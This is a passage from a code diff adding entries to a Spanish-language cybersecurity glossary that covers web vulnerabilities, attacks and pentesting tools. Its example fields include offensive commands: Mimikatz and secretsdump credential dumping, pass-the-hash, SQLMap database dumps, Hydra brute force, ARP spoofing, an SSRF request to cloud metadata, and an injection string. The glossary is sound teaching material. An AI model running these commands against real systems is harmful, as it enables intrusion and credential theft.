+                category: "Web",
+                tags: ["web", "vulnerabilidad", "access-control"],
+                definition: "Insecure Direct Object Reference - Fallo en el control de acceso que permite acceder a objetos de otros usuarios modificando identificadores.",
+                explanation: "Sucede cuando una aplicación expone referencias directas a objetos internos (IDs de usuario, archivos, documentos) sin verificar que el usuario tiene permiso para acceder a ellos. Al cambiar parámetros como user_id=123 a user_id=124, un atacante puede acceder a recursos de otros usuarios. Es común en APIs REST y endpoints que usan IDs secuenciales.",
+                example: `# Acceso a factura
+GET /api/invoice/1234 → Tu factura
+GET /api/invoice/1235 → IDOR: Factura de otro
+
+# Modificación de perfil
+POST /user/update
+{"user_id": 999, "role": "admin"}`,
+                importance: "Una de las vulnerabilidades más comunes en aplicaciones modernas. Puede resultar en acceso no autorizado a datos sensibles, modificación de información de otros usuarios, o escalación de privilegios horizontal/vertical."
+            },
+            {
+                title: "SSRF",
+                slug: "ssrf",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "redes"],
+                definition: "Server-Side Request Forgery - Vulnerabilidad que permite a un atacante hacer que el servidor realice peticiones HTTP a destinos arbitrarios.",
+                explanation: "El servidor actúa como proxy sin saberlo, haciendo peticiones en nombre del atacante. Esto permite acceder a servicios internos no expuestos a internet (169.254.169.254 en AWS para metadata, puertos internos, servicios en localhost), escanear redes internas, y en algunos casos leer archivos locales mediante protocolos file://.",
+                example: `# AWS metadata
+http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/
+
+# Port scanning interno
+http://vulnerable.com/fetch?url=http://192.168.1.5:22`,
+                importance: "Permite pivotar desde una aplicación web externa hacia la red interna de la organización, acceder a servicios cloud metadata (robo de credenciales IAM), y en general expandir dramáticamente la superficie de ataque."
+            },
+            {
+    title: "Hash",
+    slug: "hash",
+    category: "Criptografía",
+    tags: ["criptografia", "password", "seguridad"],
+    definition: "Función criptográfica que convierte datos de entrada en una cadena de longitud fija, única para ese contenido.",
+    explanation: "Los hashes son deterministas y unidireccionales, lo que significa que el mismo input genera siempre el mismo output, pero no es viable recuperar el input original. Se utilizan para almacenar contraseñas (junto con salt y algoritmos seguros como bcrypt) y para verificar la integridad de archivos. Algoritmos antiguos como MD5 o SHA1 son vulnerables a colisiones y no deben usarse en contextos críticos.",
+    example: `# Generar hash MD5
+echo -n "password" | md5sum
+
+# Verificar integridad de archivo
+sha256sum archivo.iso`,
+    importance: "Fundamental en seguridad para proteger credenciales y garantizar que los datos no han sido alterados. Un mal uso puede comprometer completamente la seguridad de un sistema."
+},
+{
+    title: "Brute Force",
+    slug: "brute-force",
+    category: "Ataques",
+    tags: ["ataque", "password", "credenciales"],
+    definition: "Ataque que consiste en probar sistemáticamente múltiples combinaciones de credenciales hasta encontrar la correcta.",
+    explanation: "Puede realizarse mediante fuerza bruta pura (todas las combinaciones posibles) o mediante diccionarios de contraseñas comunes. Herramientas como Hydra permiten automatizar estos ataques contra múltiples servicios. Su efectividad depende de la complejidad de la contraseña y de medidas defensivas como rate limiting, CAPTCHA o bloqueo de cuentas.",
+    example: `# Ataque SSH con Hydra
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+
+# Ataque HTTP POST
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`,
+    importance: "Sigue siendo uno de los métodos más efectivos contra servicios mal protegidos. Es clave entenderlo tanto para ataques como para implementar defensas adecuadas."
+},
+{
+    title: "Firewall",
+    slug: "firewall",
+    category: "Defensivas",
+    tags: ["redes", "seguridad", "defensa"],
+    definition: "Sistema de seguridad que monitoriza y controla el tráfico de red según reglas definidas.",
+    explanation: "Actúa como una barrera entre redes confiables y no confiables, filtrando paquetes en función de IP, puertos, protocolos o incluso comportamiento. Existen firewalls de red y de host, así como NGFW que incluyen inspección profunda de paquetes (DPI) y detección de amenazas avanzadas.",
+    example: `# Permitir HTTP/HTTPS
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Bloquear todo lo demás
+iptables -A INPUT -j DROP`,
+    importance: "Es una de las primeras líneas de defensa en cualquier infraestructura. Una mala configuración puede dejar servicios críticos expuestos."
+},
+{
+    title: "VPN",
+    slug: "vpn",
+    category: "Redes",
+    tags: ["redes", "privacidad", "seguridad"],
+    definition: "Tecnología que crea un túnel cifrado entre un cliente y un servidor a través de una red pública.",
+    explanation: "Permite proteger la confidencialidad e integridad del tráfico, ocultando la IP real del usuario. Es ampliamente utilizada para acceso remoto seguro a redes corporativas y para proteger comunicaciones en redes inseguras. Protocolos comunes incluyen OpenVPN, WireGuard e IPsec.",
+    example: `# Conexión a VPN OpenVPN
+openvpn --config cliente.ovpn`,
+    importance: "Esencial para proteger comunicaciones en entornos no confiables y garantizar acceso seguro a recursos internos."
+},
+{
+    title: "Malware",
+    slug: "malware",
+    category: "Malware",
+    tags: ["malware", "ataque"],
+    definition: "Software diseñado para infiltrarse, dañar o comprometer sistemas sin el conocimiento del usuario.",
+    explanation: "Incluye múltiples categorías como virus, troyanos, ransomware, spyware o rootkits. Puede propagarse mediante phishing, descargas maliciosas o explotación de vulnerabilidades. Sus objetivos van desde el robo de información hasta el control total del sistema.",
+    example: `# Ejemplo típico
+Archivo adjunto en correo phishing que instala un troyano`,
+    importance: "Es el principal vector de ataque en el mundo real. Entender sus tipos y funcionamiento es clave tanto en defensa como en análisis forense."
+},
+{
+    title: "Exploit",
+    slug: "exploit",
+    category: "Conceptos",
+    tags: ["vulnerabilidad", "explotacion"],
+    definition: "Código o técnica que aprovecha una vulnerabilidad para ejecutar acciones no autorizadas en un sistema.",
+    explanation: "Un exploit transforma una vulnerabilidad en un ataque real. Puede permitir ejecución de código, escalación de privilegios o acceso no autorizado. Se clasifican en local, remoto, client-side, entre otros, y suelen integrarse en frameworks como Metasploit.",
+    example: `# Buscar exploit
+searchsploit vsftpd
+
+# Uso en Metasploit
+use exploit/unix/ftp/vsftpd_234_backdoor`,
+    importance: "Es el elemento que convierte un fallo en una amenaza real. Sin exploit, una vulnerabilidad no siempre es explotable."
+},
+{
+    title: "Sniffing",
+    slug: "sniffing",
+    category: "Redes",
+    tags: ["redes", "ataque", "analisis"],
+    definition: "Técnica de captura e inspección de paquetes que circulan por una red.",
+    explanation: "Permite analizar tráfico en tiempo real o almacenado. Si los datos no están cifrados, pueden exponerse credenciales, cookies o información sensible. Se usa tanto para análisis legítimo como en ataques.",
+    example: `# Filtro en Wireshark
+http contains "password"`,
+    importance: "Destaca la importancia del cifrado en comunicaciones. Sin HTTPS, los datos pueden ser fácilmente interceptados."
+},
+{
+    title: "MITM",
+    slug: "mitm",
+    category: "Ataques",
+    tags: ["ataque", "redes"],
+    definition: "Ataque en el que un atacante intercepta la comunicación entre dos partes.",
+    explanation: "El atacante puede espiar, modificar o redirigir el tráfico sin que las partes lo detecten. Técnicas comunes incluyen ARP spoofing, DNS spoofing o rogue access points.",
+    example: `# ARP spoofing
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1`,
+    importance: "Permite comprometer la confidencialidad e integridad de la comunicación, especialmente en redes inseguras."
+},
+{
+    title: "JWT",
+    slug: "jwt",
+    category: "Web",
+    tags: ["auth", "token"],
+    definition: "Token basado en JSON utilizado para transmitir información autenticada entre cliente y servidor.",
+    explanation: "Está compuesto por header, payload y signature. Se usa ampliamente en autenticación de APIs. Si la firma no se valida correctamente o se usan algoritmos inseguros, puede ser manipulado por atacantes.",
+    example: `# Header típico
+{"alg":"HS256","typ":"JWT"}`,
+    importance: "Muy común en aplicaciones modernas. Una mala implementación puede permitir acceso no autorizado."
+},
+{
+    title: "Fuzzing",
+    slug: "fuzzing",
+    category: "Técnicas",
+    tags: ["testing", "ataque"],
+    definition: "Técnica que consiste en enviar datos aleatorios o malformados para descubrir fallos en una aplicación.",
+    explanation: "Se utiliza para identificar vulnerabilidades como buffer overflows, errores de validación o comportamientos inesperados. Herramientas como Burp Intruder permiten automatizar el proceso.",
+    example: `# Fuzzing con ffuf
+ffuf -u http://target/FUZZ -w wordlist.txt`,
+    importance: "Permite descubrir vulnerabilidades que no son evidentes mediante análisis manual."
+},
+{
+    title: "RCE",
+    slug: "rce",
+    category: "Vulnerabilidad",
+    tags: ["explotacion"],
+    definition: "Vulnerabilidad que permite a un atacante ejecutar código arbitrario en un sistema remoto.",
+    explanation: "Es una de las vulnerabilidades más críticas, ya que proporciona control total sobre el sistema afectado. Puede derivarse de fallos en validación de inputs, deserialización insegura o vulnerabilidades en software.",
+    example: `# Ejecución remota
+; whoami`,
+    importance: "Implica compromiso completo del sistema, siendo uno de los objetivos principales en pentesting."
+}, {
+    title: "API",
+    slug: "api",
+    category: "Conceptos",
+    tags: ["web", "backend"],
+    definition: "Interfaz que permite la comunicación entre diferentes sistemas o aplicaciones.",
+    explanation: "Define cómo interactúan los componentes de software mediante peticiones y respuestas, generalmente usando HTTP/HTTPS. Las APIs modernas suelen ser REST o GraphQL y son un objetivo frecuente en pentesting debido a errores de autenticación o validación.",
+    example: `GET /api/users
+POST /api/login`,
+    importance: "Son el núcleo de muchas aplicaciones actuales, y una mala implementación puede exponer funcionalidades críticas."
+},
+{
+    title: "Rate Limiting",
+    slug: "rate-limiting",
+    category: "Defensivas",
+    tags: ["defensa", "web"],
+    definition: "Mecanismo que limita el número de peticiones que un usuario puede realizar en un periodo de tiempo.",
+    explanation: "Se utiliza para prevenir abusos como ataques de fuerza bruta, scraping o DoS. Puede implementarse por IP, usuario o token, y suele combinarse con bloqueos temporales o CAPTCHA.",
+    example: `Máximo 5 intentos de login por minuto`,
+    importance: "Reduce significativamente el impacto de ataques automatizados y protege recursos del sistema."
+},
+{
+    title: "CVE",
+    slug: "cve",
+    category: "Conceptos",
+    tags: ["vulnerabilidad"],
+    definition: "Identificador único asignado a vulnerabilidades de seguridad conocidas públicamente.",
+    explanation: "Permite estandarizar la referencia a fallos de seguridad y facilita su seguimiento. Cada CVE incluye detalles técnicos, impacto y referencias a parches o exploits disponibles.",
+    example: `CVE-2021-44228 (Log4Shell)`,
+    importance: "Es clave para la gestión de vulnerabilidades y priorización de parches en entornos reales."
+},
+{
+    title: "Searchsploit",
+    slug: "searchsploit",
+    category: "Herramientas",
+    tags: ["herramientas", "exploits"],
+    definition: "Herramienta que permite buscar exploits locales en la base de datos de Exploit-DB.",
+    explanation: "Facilita la identificación rápida de exploits disponibles para versiones específicas de software detectadas durante el reconocimiento. Se integra directamente en sistemas como Kali Linux.",
+    example: `searchsploit apache 2.4.49`,
+    importance: "Acelera la fase de explotación al permitir localizar rápidamente código reutilizable."
+},
+{
+    title: "Enumeration",
+    slug: "enumeration",
+    category: "Reconocimiento",
+    tags: ["reconocimiento"],
+    definition: "Proceso de obtención de información detallada sobre servicios y sistemas tras el escaneo inicial.",
+    explanation: "A diferencia del reconocimiento básico, se centra en identificar usuarios, recursos compartidos, versiones exactas y configuraciones específicas. Es clave para encontrar vectores de ataque reales.",
+    example: `enum4linux -a 192.168.1.100
+rpcclient -U "" 192.168.1.100`,
+    importance: "Permite pasar de información general a datos explotables, siendo una fase crítica en pentesting."
+},
+{
+    title: "Cookie",
+    slug: "cookie",
+    category: "Web",
+    tags: ["web", "auth"],
+    definition: "Pequeño dato almacenado en el navegador que mantiene información de sesión entre peticiones.",
+    explanation: "Las cookies permiten identificar usuarios y mantener sesiones activas. Si no están protegidas (HttpOnly, Secure), pueden ser robadas mediante ataques como XSS, permitiendo secuestro de sesión.",
+    example: `Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure`,
+    importance: "Son fundamentales en autenticación web, pero también un objetivo clave para atacantes."
+},
+{
+    title: "Session",
+    slug: "session",
+    category: "Web",
+    tags: ["auth"],
+    definition: "Estado mantenido entre cliente y servidor para identificar a un usuario autenticado.",
+    explanation: "Se gestiona normalmente mediante cookies o tokens. Una mala gestión puede permitir ataques como session fixation o hijacking.",
+    example: `Usuario inicia sesión y recibe un session ID`,
+    importance: "Es clave para controlar el acceso a recursos protegidos."
+},
+{
+    title: "DoS",
+    slug: "dos",
+    category: "Ataques",
+    tags: ["ataque"],
+    definition: "Ataque que busca hacer un servicio inaccesible saturando sus recursos.",
+    explanation: "Puede realizarse enviando un gran número de peticiones o explotando vulnerabilidades que consumen recursos. No implica necesariamente múltiples máquinas.",
+    example: `Enviar miles de peticiones HTTP a un servidor`,
+    importance: "Puede causar interrupciones graves en servicios críticos."
+},
+{
+    title: "DDoS",
+    slug: "ddos",
+    category: "Ataques",
+    tags: ["ataque"],
+    definition: "Ataque distribuido que utiliza múltiples sistemas para saturar un servicio.",
+    explanation: "Se realiza mediante botnets que generan tráfico masivo desde diferentes ubicaciones, dificultando su mitigación. Puede dirigirse a aplicaciones, redes o infraestructuras completas.",
+    example: `Botnet enviando tráfico a una web objetivo`,
+    importance: "Es mucho más difícil de mitigar que un DoS y puede tumbar grandes servicios."
+},
+{
+    title: "Zero-Day",
+    slug: "zero-day",
+    category: "Vulnerabilidad",
+    tags: ["vulnerabilidad", "explotacion"],
+    definition: "Vulnerabilidad desconocida públicamente y sin parche disponible.",
+    explanation: "Los atacantes pueden explotarla antes de que el fabricante tenga conocimiento o solución. Suelen ser altamente valiosas y utilizadas en ataques avanzados.",
+    example: `Exploit desconocido usado en ataques dirigidos`,
+    importance: "Representa una de las amenazas más críticas debido a la falta de defensa inmediata."
+},
+{
+    title: "Defense in Depth",
+    slug: "defense-in-depth",
+    category: "Conceptos",
+    tags: ["defensa"],
+    definition: "Estrategia de seguridad basada en múltiples capas de protección.",
+    explanation: "Si una capa falla (por ejemplo, firewall), otras siguen protegiendo el sistema (IDS, autenticación, monitoreo). Reduce la probabilidad de compromiso total.",
+    example: `Firewall + IDS + autenticación + monitoreo`,
+    importance: "Es un principio clave en el diseño de sistemas seguros."
+}, {
+    title: "Threat",
+    slug: "threat",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Cualquier entidad o evento con capacidad de causar daño a un sistema, organización o activo.",
+    explanation: "Una amenaza puede ser un atacante externo, un empleado interno, malware o incluso un desastre natural. No implica que el ataque ocurra, sino que existe la posibilidad. En ciberseguridad, las amenazas se analizan junto con vulnerabilidades para evaluar el riesgo real.",
+    example: `Amenazas comunes:
+- Hacker intentando acceso no autorizado
+- Malware infectando sistemas
+- Empleado filtrando datos internos`,
+    importance: "Es la base del análisis de riesgos. Sin amenazas, no existe riesgo, y entenderlas es clave en cualquier evaluación de seguridad."
+},
+{
+    title: "Vulnerability",
+    slug: "vulnerability",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Debilidad en un sistema que puede ser explotada por una amenaza.",
+    explanation: "Las vulnerabilidades pueden ser técnicas (software desactualizado, mala configuración) o humanas (errores de usuario). Por sí solas no causan daño, pero combinadas con una amenaza pueden derivar en un incidente de seguridad.",
+    example: `Ejemplos:
+- Software sin parchear (CVE conocido)
+- Contraseñas débiles
+- Permisos mal configurados`,
+    importance: "Son el punto de entrada de los ataques. Identificarlas y corregirlas es una de las tareas principales en ciberseguridad."
+},
+{
+    title: "Risk",
+    slug: "risk",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Probabilidad de que una amenaza explote una vulnerabilidad causando impacto negativo.",
+    explanation: "El riesgo se calcula combinando la probabilidad de explotación y el impacto que tendría. No todas las vulnerabilidades tienen el mismo riesgo: una crítica en un sistema expuesto es más prioritaria que una en un sistema aislado.",
+    example: `Riesgo = Probabilidad × Impacto
+
+Ejemplo:
+- Alta probabilidad + alto impacto → Riesgo crítico
+- Baja probabilidad + bajo impacto → Riesgo bajo`,
+    importance: "Permite priorizar esfuerzos de seguridad y decidir qué vulnerabilidades deben corregirse primero."
+},
+{
+    title: "Asset",
+    slug: "asset",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Cualquier recurso de valor para una organización que debe ser protegido.",
+    explanation: "Los activos incluyen datos, sistemas, aplicaciones, infraestructura y personas. No todos tienen el mismo valor: una base de datos de clientes es más crítica que un equipo de pruebas. Identificar activos es el primer paso en cualquier estrategia de seguridad.",
+    example: `Ejemplos:
+- Base de datos de clientes
+- Servidor de producción
+- Credenciales de acceso`,
+    importance: "Toda la seguridad gira en proteger los activos. Sin identificarlos correctamente, no se puede aplicar una estrategia eficaz."
+},
+{
+    title: "Attack Surface",
+    slug: "attack-surface",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Conjunto total de puntos de entrada que un atacante puede utilizar para comprometer un sistema.",
+    explanation: "Incluye puertos abiertos, aplicaciones web, APIs, servicios expuestos y cualquier interacción posible con el sistema. Cuanto mayor es la superficie de ataque, mayor es la probabilidad de encontrar vulnerabilidades.",
+    example: `Ejemplo de superficie de ataque:
+- Web pública
+- API expuesta
+- Puerto SSH abierto
+- Servicios internos accesibles`,
+    importance: "Reducir la superficie de ataque es una de las formas más efectivas de mejorar la seguridad."
+},
+{
+    title: "Least Privilege",
+    slug: "least-privilege",
+    category: "Conceptos",
+    tags: ["defensa", "interview"],
+    definition: "Principio de seguridad que establece que un usuario o sistema debe tener solo los permisos estrictamente necesarios.",
+    explanation: "Evita que usuarios o procesos tengan más privilegios de los necesarios, reduciendo el impacto de un posible compromiso. Es fundamental para prevenir escalaciones de privilegios y limitar el daño en caso de ataque.",
+    example: `Ejemplo:
+- Usuario sin permisos de administrador
+- Servicio que solo puede acceder a su propia base de datos`,
+    importance: "Reduce drásticamente el impacto de ataques y es una práctica esencial en entornos seguros."
+},
+{
+    title: "OWASP Top 10",
+    slug: "owasp-top-10",
+    category: "Metodologías",
+    tags: ["metodologia", "web", "interview"],
+    definition: "Lista de las vulnerabilidades web más críticas y comunes publicada por OWASP.",
+    explanation: "Sirve como referencia para desarrolladores y pentesters para identificar riesgos en aplicaciones web. Incluye categorías como Injection, Broken Access Control, Security Misconfiguration o XSS.",
+    example: `Ejemplos:
+- Injection (SQLi)
+- Broken Authentication
+- Cross-Site Scripting (XSS)`,
+    importance: "Es un estándar en la industria y una referencia obligatoria en entrevistas de ciberseguridad."
+},
+{
+    title: "Kill Chain",
+    slug: "kill-chain",
+    category: "Metodologías",
+    tags: ["metodologia", "interview"],
+    definition: "Modelo que describe las fases de un ataque desde el reconocimiento hasta la exfiltración.",
+    explanation: "Permite entender cómo actúan los atacantes paso a paso. Las fases incluyen: reconocimiento, weaponization, delivery, explotación, instalación, comando y control, y acciones sobre objetivos.",
+    example: `Fases:
+1. Reconocimiento
+2. Explotación
+3. Persistencia
+4. Lateral Movement
+5. Exfiltración`,
+    importance: "Ayuda a identificar en qué fase se encuentra un ataque y cómo detectarlo o detenerlo."
+},
+
+{
+    title: "Backdoor",
+    slug: "backdoor",
+    category: "Malware",
+    tags: ["malware", "persistencia", "interview"],
+    definition: "Mecanismo oculto que permite acceso persistente a un sistema evitando los métodos de autenticación normales.",
+    explanation: "Puede ser instalado por atacantes tras comprometer un sistema o existir como fallo en el software. Permite mantener acceso continuo incluso después de reinicios o cambios de credenciales.",
+    example: `Ejemplo:
+Usuario oculto con privilegios de administrador`,
+    importance: "Permite a los atacantes mantener control a largo plazo sin ser detectados fácilmente."
+}, {
+                    title: "Subdomain Enumeration",
+                    slug: "subdomain-enumeration",
+                    category: "Reconocimiento",
+                    tags: ["reconocimiento", "web", "osint"],
+                    definition: "Descubrir subdominios asociados a un dominio principal.",
+                    explanation: "Los subdominios exponen servicios internos, paneles admin, staging o APIs sin protección. Técnicas: certificados SSL, fuerza bruta, DNS, scraping.",
+                    example: `# Subfinder
+subfinder -d ejemplo.com -o subdominios.txt
+
+# Certificate Transparency
+curl -s https://crt.sh/?q=%.ejemplo.com&output=json
+
+# Gobuster
+gobuster dns -d ejemplo.com -w subdomains.txt`,
+                    importance: "Muchos ataques comienzan descubriendo subdominios olvidados o mal configurados."
+                },
+                {
+                    title: "Nikto",
+                    slug: "nikto",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "escaneo"],
+                    definition: "Escáner de vulnerabilidades web open source.",
+                    explanation: "Realiza tests contra servidores web para detectar configuraciones peligrosas, archivos y programas obsoletos. Comprueba más de 6700 archivos/programas potencialmente peligrosos.",
+                    example: `# Escaneo básico
+nikto -h http://target.com
+
+# Con autenticación
+nikto -h http://target.com -id user:pass
+
+# Guardar resultados
+nikto -h http://target.com -o report.html`,
+                    importance: "Identifica rápidamente problemas comunes de configuración y software obsoleto en servidores web."
+                },
+                {
+                    title: "SQLMap",
+                    slug: "sqlmap",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "database"],
+                    definition: "Herramienta automática para detectar y explotar inyecciones SQL.",
+                    explanation: "Automatiza la detección y explotación de vulnerabilidades de inyección SQL. Soporta todos los principales DBMS y técnicas de inyección.",
+                    example: `# Detección básica
+sqlmap -u "http://target.com/page?id=1"
+
+# Extraer bases de datos
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Dump tabla
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`,
+                    importance: "Acelera dramáticamente el proceso de encontrar y explotar inyecciones SQL."
+                },
+                {
+                    title: "Gobuster",
+                    slug: "gobuster",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "reconocimiento"],
+                    definition: "Herramienta de fuerza bruta para URIs, DNS y nombres de archivos.",
+                    explanation: "Escrita en Go, extremadamente rápida para descubrir directorios ocultos, archivos y subdominios mediante fuerza bruta.",
+                    example: `# Directorios
+gobuster dir -u http://target.com -w wordlist.txt
+
+# DNS
+gobuster dns -d target.com -w subdomains.txt
+
+# VHosts
+gobuster vhost -u http://target.com -w vhosts.txt`,
+                    importance: "Encuentra recursos ocultos que no están enlazados públicamente en aplicaciones web."
+                },
+                {
+                    title: "Hashcat",
+                    slug: "hashcat",
+                    category: "Herramientas",
+                    tags: ["herramientas", "cracking", "password"],
+                    definition: "Crackeador de passwords avanzado con soporte GPU.",
+                    explanation: "Soporta más de 300 algoritmos de hash. Utiliza GPU para acelerar masivamente el cracking. Considerada la herramienta más rápida de su tipo.",
+                    example: `# MD5 con diccionario
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+
+# NTLM con reglas
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r best64.rule
+
+# WPA handshake
+hashcat -m 22000 capture.hc22000 wordlist.txt`,
+                    importance: "Aprovecha el poder de las GPUs para crackear hashes en fracción del tiempo de CPU."
+                },
+                {
+                    title: "Responder",
+                    slug: "responder",
+                    category: "Herramientas",
+                    tags: ["herramientas", "redes", "credenciales"],
+                    definition: "Herramienta para envenenamiento LLMNR, NBT-NS y MDNS.",
+                    explanation: "Intercepta peticiones de resolución de nombres en redes locales para capturar hashes de credenciales. Funciona respondiendo a broadcasts de red.",
+                    example: `# Modo básico
+responder -I eth0
+
+# Análisis sin responder
+responder -I eth0 -A
+
+# Con WPAD
+responder -I eth0 -w`,
+                    importance: "Captura credenciales en texto claro o hashes NT en redes Windows sin levantar alarmas."
+                },
+                {
+                    title: "Mimikatz",
+                    slug: "mimikatz",
+                    category: "Herramientas",
+                    tags: ["herramientas", "windows", "credenciales"],
+                    definition: "Herramienta para extraer credenciales de memoria en Windows.",
+                    explanation: "Puede extraer passwords en texto claro, hashes, PINs y tickets Kerberos de la memoria. Fundamental para post-explotación en Windows.",
+                    example: `# Extraer credenciales
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+
+# Extraer tickets Kerberos
+mimikatz.exe "sekurlsa::tickets"
+
+# Pass-the-Hash
+mimikatz.exe "sekurlsa::pth /user:admin /ntlm:<hash>"`,
+                    importance: "Herramienta esencial para movimiento lateral en entornos Windows Active Directory."
+                },
+                {
+                    title: "CrackMapExec",
+                    slug: "crackmapexec",
+                    category: "Herramientas",
+                    tags: ["herramientas", "redes", "windows"],
+                    definition: "Swiss army knife para pentesting de redes Windows.",
+                    explanation: "Automatiza la evaluación de seguridad de grandes redes Active Directory. Soporta SMB, WinRM, MSSQL, LDAP, SSH.",
+                    example: `# Escaneo SMB
+crackmapexec smb 192.168.1.0/24
+
+# Pass-the-Hash
+crackmapexec smb 192.168.1.0/24 -u admin -H <hash>
+
+# Ejecutar comando
+crackmapexec smb 192.168.1.10 -u admin -p pass -x "whoami"`,
+                    importance: "Permite evaluar rápidamente la seguridad de toda una red Windows."
+                },
+                {
+                    title: "BloodHound",
+                    slug: "bloodhound",
+                    category: "Herramientas",
+                    tags: ["herramientas", "windows", "active-directory"],
+                    definition: "Herramienta para mapear relaciones en Active Directory.",
+                    explanation: "Usa teoría de grafos para revelar relaciones ocultas en AD. Identifica rutas de ataque complejas que serían imposibles de ver manualmente.",
+                    example: `# Recolectar datos (SharpHound)
+SharpHound.exe -c All
+
+# Importar en BloodHound
+# Upload .zip file to BloodHound GUI
+
+# Query común
+MATCH p=shortestPath((u:User)-[*1..]->(c:Computer)) RETURN p`,
+                    importance: "Revela caminos de escalación de privilegios en AD que pasarían desapercibidos."
+                },
+                {
+                    title: "Impacket",
+                    slug: "impacket",
+                    category: "Herramientas",
+                    tags: ["herramientas", "windows", "redes"],
+                    definition: "Colección de clases Python para trabajar con protocolos de red.",
+                    explanation: "Proporciona acceso programático a protocolos Windows: SMB, MSRPC, LDAP, Kerberos. Incluye scripts para pentesting.",
+                    example: `# PsExec
+psexec.py DOMAIN/user:pass@192.168.1.10
+
+# SecretsDump
+secretsdump.py DOMAIN/user:pass@192.168.1.10
+
+# GetNPUsers (ASREPRoast)
+GetNPUsers.py DOMAIN/ -usersfile users.txt`,
+                    importance: "Toolkit imprescindible para pentesting de redes Windows sin necesidad de herramientas Windows."
+                },
+                {
+                    title: "Nessus",
+                    slug: "nessus",
+                    category: "Herramientas",
+                    tags: ["herramientas", "escaneo", "vulnerabilidades"],
+                    definition: "Escáner de vulnerabilidades comercial ampliamente usado.",
+                    explanation: "Identifica vulnerabilidades, malware, configuraciones incorrectas. Base de datos actualizada constantemente con nuevas vulnerabilidades.",
+                    example: `# Escaneo básico desde GUI
+1. Crear nueva política de escaneo
+2. Configurar targets
+3. Ejecutar escaneo
+4. Revisar resultados por criticidad`,
+                    importance: "Estándar industrial para auditorías de vulnerabilidades en entornos corporativos."
+                },
+                {
+                    title: "OpenVAS",
+                    slug: "openvas",
+                    category: "Herramientas",
+                    tags: ["herramientas", "escaneo", "vulnerabilidades"],
+                    definition: "Framework de escaneo de vulnerabilidades open source.",
+                    explanation: "Alternativa gratuita a Nessus. Incluye más de 50,000 tests de vulnerabilidades (NVTs). Actualización constante de la base de datos.",
+                    example: `# Iniciar servicios
+gvm-start
+
+# Acceder web UI
+https://localhost:9392
+
+# Crear target y escanear`,
+                    importance: "Solución completa y gratuita para escaneo de vulnerabilidades."
+                },
+                {
+                    title: "Aircrack-ng",
+                    slug: "aircrack-ng",
+                    category: "Herramientas",
+                    tags: ["herramientas", "wireless", "cracking"],
+                    definition: "Suite de herramientas para auditoría de redes WiFi.",
+                    explanation: "Captura paquetes, analiza tráfico wireless y crackea claves WEP/WPA/WPA2. Suite completa: airodump, aireplay, aircrack.",
+                    example: `# Modo monitor
+airmon-ng start wlan0
+
+# Capturar handshake
+airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+
+# Crack WPA
+aircrack-ng -w wordlist.txt capture.cap`,
+                    importance: "Estándar para auditorías de seguridad wireless y tests de penetración WiFi."
+                },
+                {
+                    title: "Recon-ng",
+                    slug: "recon-ng",
+                    category: "Herramientas",
+                    tags: ["herramientas", "reconocimiento", "osint"],
+                    definition: "Framework de reconocimiento web con interfaz modular.",
+                    explanation: "Automatiza OSINT con módulos para diferentes fuentes. Interfaz similar a Metasploit. Base de datos integrada para almacenar resultados.",
+                    example: `# Instalar módulos
+marketplace install all
+
+# Usar módulo
+modules load recon/domains-hosts/google_site_web
+run
+
+# Ver resultados
+show hosts`,
+                    importance: "Centraliza y automatiza la fase de reconocimiento pasivo."
+                },
+                {
+                    title: "TheHarvester",
+                    slug: "theharvester",
+                    category: "Herramientas",
+                    tags: ["herramientas", "reconocimiento", "osint"],
+                    definition: "Herramienta para recolectar información de fuentes públicas.",
+                    explanation: "Recopila emails, subdominios, hosts, nombres de empleados, puertos abiertos y banners de diferentes fuentes públicas.",
+                    example: `# Buscar en todas las fuentes
+theHarvester -d ejemplo.com -b all
+
+# Fuente específica
+theHarvester -d ejemplo.com -b google
+
+# Limitar resultados
+theHarvester -d ejemplo.com -b bing -l 200`,
+                    importance: "Rápida recolección de información inicial sobre un objetivo."
+                },
+                {
+                    title: "Shodan",
+                    slug: "shodan",
+                    category: "Herramientas",
+                    tags: ["herramientas", "reconocimiento", "iot"],
+                    definition: "Motor de búsqueda para dispositivos conectados a Internet.",
+                    explanation: "Indexa banners de servicios expuestos: webcams, routers, servidores, IoT. Permite buscar dispositivos vulnerables por tecnología, país, organización.",
+                    example: `# Búsqueda web
+https://shodan.io
+
+# CLI
+shodan search apache
+
+# Filtros
+shodan search "port:22 country:ES"`,
+                    importance: "Identifica dispositivos expuestos y mal configurados en Internet."
+                },
+                {
+                    title: "Maltego",
+                    slug: "maltego",
+                    category: "Herramientas",
+                    tags: ["herramientas", "reconocimiento", "osint"],
+                    definition: "Plataforma de inteligencia y análisis forense gráfico.",
+                    explanation: "Visualiza relaciones entre personas, empresas, dominios, IPs. Usa transformaciones para descubrir conexiones automáticamente.",
+                    example: `# Workflow típico
+1. Crear nuevo grafo
+2. Añadir entidad (domain, persona, IP)
+3. Ejecutar transformaciones
+4. Analizar relaciones descubiertas`,
+                    importance: "Visualiza y descubre conexiones complejas que serían difíciles de ver en texto."
+                },
+                {
+                    title: "Censys",
+                    slug: "censys",
+                    category: "Herramientas",
+                    tags: ["herramientas", "reconocimiento", "certificados"],
+                    definition: "Motor de búsqueda para certificados SSL y hosts.",
